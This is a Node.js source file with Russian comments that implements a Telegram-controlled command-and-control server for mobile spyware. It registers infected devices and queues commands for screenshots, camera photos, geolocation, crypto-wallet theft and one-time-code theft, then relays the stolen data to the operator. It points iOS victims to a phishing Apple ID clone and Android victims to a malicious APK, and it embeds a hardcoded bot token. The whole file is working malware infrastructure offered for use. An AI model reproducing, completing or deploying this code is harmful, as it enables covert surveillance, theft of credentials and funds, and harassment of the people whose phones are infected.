// bot.js
const { Telegraf, Markup } = require('telegraf');
const { exec } = require('child_process');
const axios = require('axios');

const BOT_TOKEN = '9001719911:AAFr3K_Kc6OXGvzuRzjTWJe76U98pYEPS98';
const ADMIN_ID = 9256345316;
const bot = new Telegraf(BOT_TOKEN);

// Хранилище активных устройств
const devices = {};

bot.start((ctx) => {
  if (ctx.from.id !== ADMIN_ID) return;
  ctx.reply('C2 Server Online', Markup.inlineKeyboard([
    [Markup.button.callback('📁 Генерация файла', 'gen')],
    [Markup.button.callback('💻 Устройства', 'devs')]
  ]));
});

bot.action('gen', (ctx) => {
  if (ctx.from.id !== ADMIN_ID) return;
  ctx.editMessageText('На какое устройство нужен файл?', Markup.inlineKeyboard([
    [Markup.button.callback('iPhone', 'gen_ios'), Markup.button.callback('Android', 'gen_android')]
  ]));
});

bot.action('gen_ios', (ctx) => {
  // iOS не позволяет запускать EXE, поэтому кидаем фишинг
  ctx.editMessageText('Для iOS используется веб-клон. Ссылка: https://apple-id-verify.com/login (пример)');
});

bot.action('gen_android', (ctx) => {
  // Ссылка на скачивание скомпилированного APK
  ctx.editMessageText('Файл Nerogram.apk готов. Ссылка: https://твой-хостинг/Nerogram.apk');
});

bot.action('devs', (ctx) => {
  if (Object.keys(devices).length === 0) return ctx.reply('Нет подключенных устройств.');
  const buttons = Object.keys(devices).map(id => [Markup.button.callback(`📱 ${devices[id].name}`, `dev_${id}`)]);
  ctx.editMessageText('Выбери устройство:', Markup.inlineKeyboard(buttons));
});

bot.action(/^dev_(\w+)$/, (ctx) => {
  const id = ctx.match[1];
  ctx.editMessageText(`Управление ${devices[id].name}`, Markup.inlineKeyboard([
    [Markup.button.callback('🔊 Стоны', `cmd_${id}_moan`), Markup.button.callback('📸 Скрин', `cmd_${id}_screen`)],
    [Markup.button.callback('📷 Фото', `cmd_${id}_photo`), Markup.button.callback('📍 Гео', `cmd_${id}_geo`)],
    [Markup.button.callback('💰 Крипта', `cmd_${id}_crypto`), Markup.button.callback('🔑 Код', `cmd_${id}_otp`)]
  ]));
});

// Обработка команд от админа
bot.action(/^cmd_(\w+)_(\w+)$/, async (ctx) => {
  const [_, devId, cmd] = ctx.match;
  const dev = devices[devId];
  if (!dev) return ctx.answerCbQuery('Устройство оффлайн');

  // Отправляем задачу устройству
  dev.queue.push(cmd);
  ctx.answerCbQuery(`Команда ${cmd} отправлена`);
});

// Прием данных от ратника (через HTTP)
const express = require('express');
const app = express();
app.use(express.json());

// Регистрация устройства и получение команд
app.post('/api/checkin', (req, res) => {
  const { id, name, os } = req.body;
  if (!devices[id]) devices[id] = { name, os, queue: [], lastSeen: Date.now() };
  devices[id].lastSeen = Date.now();
  
  // Отдаем следующую команду из очереди
  const cmd = devices[id].queue.shift() || null;
  res.json({ command: cmd });
});

// Прием результатов (фото, скрины, гео)
app.post('/api/data', async (req, res) => {
  const { id, type, data, text } = req.body;
  if (type === 'photo') {
    await bot.telegram.sendPhoto(ADMIN_ID, { source: Buffer.from(data, 'base64') });
  } else if (type === 'text') {
    await bot.telegram.sendMessage(ADMIN_ID, `[${id}] ${text}`);
  }
  res.send('OK');
});

app.listen(3000, () => console.log('C2 API on port 3000'));
bot.launch();
